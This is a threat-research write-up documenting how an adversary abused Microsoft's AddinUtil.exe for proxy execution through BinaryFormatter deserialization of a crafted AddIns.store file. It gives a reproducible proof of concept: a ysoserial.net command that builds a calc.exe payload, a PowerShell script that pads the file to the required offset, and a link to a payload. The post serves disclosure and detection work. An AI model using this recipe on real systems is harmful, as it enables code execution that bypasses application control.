    "### TLDR;\n",
    "\n",
    "An investigation discovered an adversary exploiting the native Microsoft.NET binary AddinUtil.exe to proxy execution. We go on a journey to reproduce their attack, document a previously unknown LOLBAS technique, and provide detection opportunities to the community.\n",
    "\n",
    "### Introduction\n",
    "\n",
    "Microsoft's [recommended block rules](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-block-rules) for Windows Defender Application Control (WDAC) is a fairly extensive list of legitimate binaries often exploited by malicious actors seeking to execute code. Nevertheless, those curious about the reasons behind these binaries' inclusion on the list may be disappointed by the lack of available information. During an investigation we encountered an adversary leverging `AddinUtil.exe` for execution [T1218](https://attack.mitre.org/techniques/T1218/), a binary in the WDAC recommended block list, and began researching.  \n",
    "\n",
    "**Understanding AddinUtil.exe**\n",
    "\n",
    "The legitimate use case for AddinUtil is somewhat elusive, it appears to be related to Microsoft Office Add-Ins, with the help message stating:\n",
    "\n",
    "> \"This tool updates the cache file in the specified folder, informing the add-in model that new add-in segments have been deployed into this folder. The pipeline root should be a folder containing subfolders for various add-in segments like host adapters, contracts, an optional AddIns subfolder, etc.\"\n",
    "\n",
    "Additionally, AddinUtil.exe is relatively old and dates back to at least version 3.5 of the .NET framework (November 2007).\n",
    "\n",
    "With general information about the binary limited, and the absence of public threat research, we found ourselves at square one in determining the method of proxy execution.\n",
    "\n",
    "Fortunately, AddinUtil.exe is a C# application. This makes it relatively straightforward to disssect and analyze the execution flow with tools such as [dnSpy](https://github.com/dnSpyEx/dnSpy). \n",
    "\n",
    "### Observed Technique\n",
    "\n",
    "We observed the threat actor create a folder masquerading as an Outlook CRM plugin. The adversary also created a file with an unknown extension called `AddIns.store`. Finally, the actor proceeded to switch their current working directory to the Outlook CRM plugin folder and execute `AddinUtil.exe` with the following command:\n",
    "```markdown\n",
    "C:\\Users\\User\\Desktop\\CRM_Outlook_Addin>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInUtil.exe -AddinRoot:.\n",
    "```\n",
    "\n",
    "The command line parameter `-AddinRoot` gave us a good starting point to begin a deeper investigation into the AddinUtil binary. The argument \".\" indicates the execution directory of `C:\\Users\\User\\Desktop\\CRM_Outlook_Addin`, which contained the `AddIns.store` file. Using these key pieces of information, dynamic analysis of the binary began. \n",
    "\n",
    "Our first aim is to understand how `AddIns.store` is loaded by AddInUtil.exe using the `-AddinRoot:` parameter. \n",
    "\n",
    "We replicated the same folder structure, file names, and command-line arguments; however, we left our `AddIns.store` file empty because we did not have the original. \n",
    "\n",
    "Our first execution produced the following output:\n",
    "```markdown\n",
    "C:\\Users\\User\\Desktop\\CRM_Outlook_Addin>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInUtil.exe -AddinRoot:.\n",
    "Error: System.InvalidOperationException: Add-In deployment cache file C:\\Users\\User\\Desktop\\CRM_Outlook_Addin\\AddIns.store is corrupted. \n",

    "Upon discovering the usage of `BinaryFormatter.Deserialize`, we recognized the risk, given its reputation for being insecure. Microsoft states:\n",
    "\n",
    " > \"...assume that calling BinaryFormatter.Deserialize over a payload is the equivalent of interpreting that payload as a standalone executable and launching it.\"\n",
    "\n",
    "To replicate the attack, we realized the need to exploit a deserialization vulnerability in AddinUtil for proxy execution. Alvaro MuÃ±oz's project, [ysoserial.net](https://github.com/pwntester/ysoserial.net), offers an excellent toolset for crafting payloads to exploit various .NET deserialization vulnerabilities.\n",
    "\n",
    "### Proof of Concept\n",
    "\n",
    "To reproduce the attack we began with the .NET gadget `TextFormattingRunProperties`, chosen for its smaller size. It's worth noting that many other gadgets are available; experiment and determine which you prefer. Our payload is crafted with the following arguments:\n",
    "```markdown\n",
    "ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -c calc.exe -o raw >> C:\\Users\\User\\Desktop\\CRM_Outlook_Addin\\Addins.Store\n",
    "```\n",
    "\n",
    "If successful the payload will launch the Windows calculator app. However, we instead recieved the error:\n",
    "```markdown\n",
    "C:\\Users\\User\\Desktop\\CRM_Outlook_Addin>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInUtil.exe -AddinRoot:.\n",
    "Rerunning this Error: System.InvalidOperationException: The Add-in store is corrupt. Please use AddInUtil and rebuild this store: C:\\Users\\User\\Desktop\\CRM_Outlook_Addin\\AddIns.store ---> System.Runtime.Serialization.SerializationException: The input stream is not a valid binary format. The starting contents (in bytes) are: 00-00-00-00-00-0C-02-00-00-00-57-53-79-73-74-65-6D ...\n",
    "   at System.Runtime.Serialization.Formatters.Binary.SerializationHeaderRecord.Read(__BinaryParser input)\n",
    "   ...\n",
    "```\n",
    "\n",
    "This error is interesting; suggesting the input `AddIns.store` file isn't correctly formatted and the binary format did not deserialize as expected. It also provides the starting bytes of `00-00-00-00-00-0C-02`. Looking at the actual starting bytes of the file, we see `00-01-00-00-00-FF-FF`. The byte sequence provided by the error code starts at offset `0x0C`, rather than `0x00`. \n",
    "\n",
    "Looking back at the ReadCache code, we see two very important lines preceding the Deserialization method:\n",
    "\n",
    "```cs\n",
    "int num = binaryReader.ReadInt32();\n",
    "long num2 = binaryReader.ReadInt64();\n",
    "```\n",
    "\n",
    "These two methods are responsible for effectively shifting the binary stream by 4-bytes and 8-bytes respectively. This causes the `AddIns.store` file to be read starting at the 13th byte (offset `0x0C`). To account for this, we need to pad our `AddIns.store` file by 12 bytes. This can be accomplished with the below powershell script.\n",
    "\n",
    "```powershell\n",
    "$filePath = \"C:\\Users\\User\\Desktop\\CRM_Outlook_Addin\\AddIns.Store\"\n",
    "\n",
    "$existingContent = Get-Content -Path $filePath -Encoding Byte\n",
    "$modifiedContent = [byte[]](0) * 12 + $existingContent\n",
    "$modifiedContent | Set-Content -Path $filePath -Encoding Byte -NoNewline\n",
    "```\n",
    "\n",
    "After correcting our padding and executing our [payload](https://gist.github.com/SILJAEUROPA/a850d476179d73df230a876944e9f3b1#file-addins-store) we successfully replicated the attack:\n",
